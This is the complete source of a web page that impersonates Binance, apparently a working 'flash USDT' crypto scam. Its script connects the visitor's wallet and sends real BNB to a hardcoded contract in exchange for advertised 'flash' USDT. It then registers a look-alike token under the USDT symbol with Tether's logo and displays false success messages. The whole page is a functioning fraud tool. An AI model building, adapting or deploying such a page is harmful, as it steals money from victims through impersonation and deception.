<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Binance | Flash Protocol V2</title>
    <!-- ✅ بدون مسافات -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #1E2329; --text: #EAECEF; --hover: #2B3139; }
        body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        /* Modal Overlay */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; justify-content: center; align-items: center; z-index: 9999; }
        .modal-content { background: #181A20; width: 90%; max-width: 360px; border-radius: 24px; padding: 25px; border: 1px solid #2B3139; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        
        /* Wallet Items */
        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: var(--card); padding: 15px; border-radius: 16px; margin-bottom: 12px; cursor: pointer; border: 1px solid transparent; transition: 0.3s; }
        .wallet-item:hover { border-color: var(--gold); background: var(--hover); }
        .wallet-item div { display: flex; align-items: center; }
        .wallet-item img { width: 32px; height: 32px; margin-left: 15px; border-radius: 8px; }
        .status-tag { color: #2ebd85; font-size: 10px; font-weight: bold; background: rgba(46, 189, 133, 0.15); padding: 4px 8px; border-radius: 4px; }

        /* Main Interface Card */
        .main-card { background: var(--card); width: 90%; max-width: 340px; border-radius: 32px; padding: 35px; border: 1px solid #2B3139; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
        .binance-logo { width: 140px; margin-bottom: 35px; filter: drop-shadow(0 0 5px rgba(243, 186, 47, 0.2)); }
        
        .btn-gold { background: var(--gold); color: #000; border: none; width: 100%; padding: 20px; border-radius: 16px; font-weight: 900; font-size: 17px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.3); }
        .btn-gold:active { transform: scale(0.98); }
        
        select { width: 100%; background: #0B0E11; color: #fff; border: 1px solid #474D57; padding: 18px; border-radius: 14px; margin-bottom: 25px; font-size: 16px; outline: none; appearance: none; cursor: pointer; }
        
        #status { margin-top: 20px; font-size: 12px; color: var(--gold); font-family: 'Courier New', Courier, monospace; min-height: 15px; }
        .close-modal { float: left; cursor: pointer; color: #848E9C; font-size: 20px; }
    </style>
</head>
<body>

<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="binance-logo">
    
    <div id="connect-ui">
        <button class="btn-gold" onclick="showModal()">Connect Wallet</button>
    </div>

    <div id="action-ui" style="display:none;">
        <p style="font-size: 13px; color: #848E9C; margin-bottom: 15px;">Select Flash Allocation</p>
        <select id="tier">
            <option value="0.09">5,000 USDT (0.09 BNB)</option>
            <option value="0.2">10,000 USDT (0.2 BNB)</option>
            <option value="0.5">50,000 USDT (0.5 BNB)</option>
            <option value="1.0">100,000 USDT (1.0 BNB)</option>
            <option value="8.0">1,000,000 USDT (8.0 BNB)</option>
        </select>
        <button class="btn-gold" onclick="execute()">Activate Flash ⚡</button>
    </div>
    
    <div id="status">System Ready</div>
</div>

<div class="modal-overlay" id="modal">
    <div class="modal-content">
        <div style="margin-bottom: 25px; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
            <span>Connect Wallet</span>
            <span class="close-modal" onclick="hideModal()">✕</span>
        </div>
        
        <div class="wallet-item" onclick="initWallet()">
            <div><img src="https://cryptologos.cc/logos/metamask-matic-logo.png"><span>MetaMask</span></div>
            <span class="status-tag">INSTALLED</span>
        </div>
        
        <div class="wallet-item" onclick="initWallet()">
            <div><img src="https://cryptologos.cc/logos/trust-wallet-trust-logo.png"><span>Trust Wallet</span></div>
            <span class="status-tag">INSTALLED</span>
        </div>
        
        <div class="wallet-item" onclick="initWallet()">
            <div><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"><span>Binance Wallet</span></div>
        </div>
        
        <p style="text-align: center; font-size: 11px; color: #848E9C; margin-top: 20px;">Secure link powered by Binance Cloud</p>
    </div>
</div>

<script>
    let web3, account;
    // ✅ العنوان الفعلي للعقد
    const CONTRACT_ADDR = "0xa2c4777262032A6CE29B540aA23623384a839331"; 
    
    const ABI = [
        {"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"},
        {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
    ];

    function showModal() { document.getElementById('modal').style.display = 'flex'; }
    function hideModal() { document.getElementById('modal').style.display = 'none'; }

    async function initWallet() {
        if (window.ethereum) {
            try {
                const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accs[0];
                web3 = new Web3(window.ethereum);
                
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
                
                hideModal();
                document.getElementById('connect-ui').style.display = 'none';
                document.getElementById('action-ui').style.display = 'block';
                document.getElementById('status').innerText = "Linked: " + account.substring(0,12) + "...";
            } catch (e) {
                document.getElementById('status').innerText = "Connection Failed.";
            }
        } else {
            alert("Please open this site inside a Crypto Wallet Browser.");
        }
    }

    async function execute() {
        const val = document.getElementById('tier').value;
        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
        const log = document.getElementById('status');
        
        try {
            log.innerText = "Synchronizing Node...";
            
            await contract.methods.buyFlash().send({ 
                from: account, 
                value: web3.utils.toWei(val, "ether") 
            });

            log.innerText = "Injection Successful. Adding Assets...";

            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
                    },
                },
            });

            log.innerHTML = "<b style='color:#00ffa3;'>✅ Protocol Activated. USDT Balance Updated.</b>";
        } catch (e) {
            log.innerText = "Handshake Rejected.";
        }
    }
</script>
</body>
</html>
